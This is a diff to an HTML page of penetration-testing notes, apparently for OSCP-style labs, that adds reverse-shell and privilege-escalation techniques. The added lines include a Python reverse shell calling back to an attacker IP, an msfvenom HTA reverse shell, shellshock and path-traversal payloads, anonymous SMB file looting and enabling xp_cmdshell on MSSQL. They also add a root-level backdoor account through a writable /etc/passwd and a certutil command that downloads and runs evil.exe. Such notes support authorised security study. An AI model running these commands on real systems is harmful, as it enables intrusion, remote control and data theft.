@@ -50,13 +50,108 @@
 <p id="codebox">sudo msfvenom -p windows/shell_reverse_tcp LHOST=KALIIP LPORT=KALIPORT -f hta-psh -o evil.hta</p>
 
 <hr>
+<h1>Reverse Shells</h1>
+<p id="info">Reverse Shell Cheat Sheets</p>
+<p id="codebox"><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">Reverse Shell Cheat Sheet #1</a></p>
 
+
+<p id="info">Python Reverse Shell #1</p>
+<p id="codebox">import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$KALIIP",$KALIPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")</p>
+
+<p id="info"></p>
+<p id="codebox"></p>
+
+
+
+<hr>
+<h1>Linux TTY Shell Cheat Sheet</h1>
+<p id="info">Linux TTY Shell Cheat Sheets</p>
+<p id="codebox"><a href="https://steflan-security.com/linux-tty-shell-cheat-sheet/">Linux TTY Shell Cheat Sheet #1</a></p>
+
+
+<p id="info">Python #1</p>
+<p id="codebox">
+    python -c 'import pty;pty.spawn("/bin/bash")' <br>
+    cntrl + z <br>
+    stty raw -echo; fg 
+</p>
+
+<p id="info">Python #2</p>
+<p id="codebox">
+    python2 -c 'import pty;pty.spawn("/bin/bash")' <br>
+    cntrl + z <br>
+    stty raw -echo; fg 
+</p>
+
+<p id="info">Python #3</p>
+<p id="codebox">
+    python3 -c 'import pty;pty.spawn("/bin/bash")' <br>
+    cntrl + z <br>
+    stty raw -echo; fg 
+</p>
+
+
+<p id="info">VIM #1</p>
+<p id="codebox">vim --cmd ':set shell=/bin/sh|:shell'</p>
+
+<p id="info"></p>
+<p id="codebox"></p>
+
+
+
+<hr>
 
 <h1>Ports</h1>
+<p id="info"></p>
+<p id="codebox"></p>
+
+<h2>FTP - TCP/21 </h2>
+<p id="info">Download Files #1</p>
+<p id="codebox">wget -m ftp://$USERNAME:PASSWORD@$TARGET</p>
+
+
+
+
+<h2>HTTP/S - TCP/80 & TCP/443 </h2>
+<p id="info">Scan for CGIs</p>
+<p id="codebox">gobuster dir -u http://$TARGET/ -w /usr/share/dirb/wordlists/vulns/cgis.txt -s "200" | grep "200"</p>
+
+<p id="info">Check for LFI Exploit</p>
+<p id="codebox">http://$TARGET/$CGIFOLDERLOCATION/$EXPLOITABLE.cgi?list=../../../../../../../../etc/passwd</p>
+
+<p id="info">Testing shellshock #1</p>
+<p id="codebox">curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa;  whoami 0>&1; echo zzzz;'" \
+    http://$TARGET/$CGIFOLDERLOCATION/$EXPLOITABLE.cgi -s | sed -n '/aaaa/{:a;n;/zzzz/b;p;ba}'</p>
+
+<p id="info">Testing shellshock #2</p>
+<p id="codebox">
+    git clone https://github.com/p33kab00/shellshock-scan.git <br>
+    python2 shellshock-scan.py http://$TARGET/ [optional- usr/share/wordlist/cgi-scripts.lst]
+
+</p>
+
+<p id="info"></p>
+<p id="codebox"></p>
+
+<p id="info"></p>
+<p id="codebox"></p>
+
+
+
+
+
+
+
+
+
+
+
 <h2>SMB - TCP/445</h2>
 <p id="info">List shares</p>
 <p id="codebox">smbclient -L //$TARGET/</p>
 <p id="codebox">smbclient -L //$TARGET/ -p $PORT #Specify non-standard SMB/Samba port</p>
+
+
 
 <p id="info">The SMB shares discovered have the following permissions</p>
 <p id="codebox">smbmap -H $TARGET</p>
@@ -64,9 +159,13 @@
 <p id="codebox">smbget -R smb://$TARGET/$SHARE</p>
 <p id="codebox">smbget -R smb://$TARGET:$TARGETPORT/$SHARE #Specify non-standard SMB/Samba port</p>
 
-<p id="info">Download files</p>
+<p id="info">Download all files #1</p>
+<p id="codebox">smbclient //$TARGET/$SHARE -U " "%" " <br>
+    prompt<br>
+    mget *</p>
+
+<p id="info">Download all files #2</p>
 <p id="codebox">
-    cd loot<br>
     smbclient \\\\$TARGET\\$SHARE<br>
     prompt<br>
     mget *</p>
@@ -77,6 +176,31 @@
 <p id="info">Check if vulnerable to SambaCry</p>
 <p id="codebox">sudo nmap $TARGET -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -oN scans/$NAME-nmap-scripts-smb-vuln-cve-2017-7494</p>
 
+<p id="info">Enumerate Samba</p>
+<p id="codebox">enum4linux -v  $IP</p>
+
+<p id="info">Find Samba Version Script</p>
+<p id="codebox">add script</p>
+
+
+<h2>Microsoft SQL Server - TCP/1433</h2>
+<p id="info">Login with found credentials</p>
+<p id="codebox">/opt/impacket/examples/mssqlclient.py $DBUSERNAME:$PASSWORD@$TARGET</p>
+
+<p id="info">Enable xp_cmdshell with sp_configure to run system commands</p>
+<p id="codebox">
+    -- This turns on advanced options and is needed to configure xp_cmdshell<br>
+    EXEC sp_configure 'show advanced options', '1'<br>
+    RECONFIGURE<br>
+    -- This enables xp_cmdshell<br>
+    EXEC sp_configure 'xp_cmdshell', '1' <br>
+    RECONFIGURE<br>
+    -- Using command cp_cmdshell I can see its running as system. This means mysql is running as this user<br>
+    xp_cmdshell  whoami <br>
+</p>
+
+<p id="info"></p>
+<p id="codebox"></p>
 
 
 <h2>VNC - TCP/5800 & TCP/5900 </h2>
@@ -95,6 +219,12 @@
 
 <h1>Privilege Escalation</h1>
 <h2>Windows</h2>
+<h3>Intial - Recon</h3>
+<p id="info">Guides on what to look for</p>
+<p id="codebox"><a href="https://notchxor.github.io/oscp-notes/4-win-privesc/1-initial/">Initial Recon</a></p>
+<p id="info">Find Writable Folders</p>
+<p id="codebox">powershell Get-ChildItem C:\ -Recurse | Get-Acl</p>
+
 <h3>Juicy Potato - ImpersonatePrivilege and/or SeAssignPrimaryTokenPrivilege enabled</h3>
 <p id="info">Check to see if they are enabled</p>
 <p id="codebox">whoami /priv</p>
@@ -112,16 +242,48 @@
 <h4>Kali</h4>
 <p id="codebox">nc -lvnp 1337 $KALIPORT</p>
 
-
 <h3>Windows XP SP0/SP1 Privilege Escalation to System</h3>
 <p id="info">Check OS name and version to see if target is vulnerable</p>
 <p id="codebox">systeminfo</p>
 <p id="codebox"><a href="https://sohvaxus.github.io/content/winxp-sp1-privesc.html">Guide to Exploit</a></p>
 
-<h2>Bypass UAC</h2>
+<h3>Bypass UAC</h3>
 <p id="info">Event Viewer Bypass UAC</p>
 <p id="codebox"><a href="https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/">Guide to Exploit</a></p>
-<p id="codebox"><a href="">Script with steps on how to use it</a></p>
+<p id="codebox"><a href="https://github.com/JeffGThompson/offsec-notes.io/blob/main/Scripts/Windows/UAC/zero2hero/eventvwr-bypassuac.c">Script with steps on how to use it</a></p>
+
+
+<h2>Linux</h2>
+
+<p id="info"></p>
+<p id="codebox"></p>
+
+<p id="info">Find Writable Folders</p>
+<p id="codebox">find / -writable -type d 2>/dev/null</p>
+
+
+
+
+<p id="info">/etc/passwd writable</p>
+<p id="codebox">
+    #Not really necessary unless you want the password to be different<br>
+    openssl passwd -1 -salt ignite pass123<br>
+    vi /etc/passwd <br>
+    #Add the following line<br>
+    hacker:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root/bin/bash<br>
+    #Login with password pass123 and user hacker<br>
+    su hacker<br>
+    password: pass123
+</p>
+
+
+<p id="info"></p>
+<p id="codebox"></p>
+
+
+
+<p id="info"></p>
+<p id="codebox"></p>
 
 
 <hr>
@@ -138,6 +300,10 @@
     $cli.Headers['User-Agent'] = 'myUserAgentString'; 
     $cli.DownloadFile('http://$KALIIP/evil.exe', 'C:\Users\Jeff_admin\Desktop\evil.exe') 
 } </p>
+<p id="info">Windows Download file #3</p>
+<h4>Victim</h4>
+<p id="codebox">certutil.exe -urlcache -split -f http://$KALIIP/evil.exe  C:\Microsoft\evil.exe  & C:\Microsoft\evil.exe </p>
+
 <h2>TFTP</h2>
 <h4>Kali</h4>
 <p id="info">On Kali starts up tftp. All files will be put in /tftp</p>
@@ -159,6 +325,12 @@
 <p id="codebox">nc.exe -nlvp 4455 > C:\Users\offsec\Desktop\$fileName.exe</p>
 <h4>Kali (Sender)</h4>
 <p id="codebox">nc -w 3 $TARGET 4455 < $fileName.exe</p>
+
+<h2>CURL</h2>
+<p id="info">Getting file  from Kali #1</p>
+<h4>Victim (Receiver)</h4>
+<p id="codebox">curl http://$KALIIP/$fileName.sh -o $fileName.sh</p>
+
 
 <h2>Python</h2>
 <p id="info">Setting up web server #1</p>
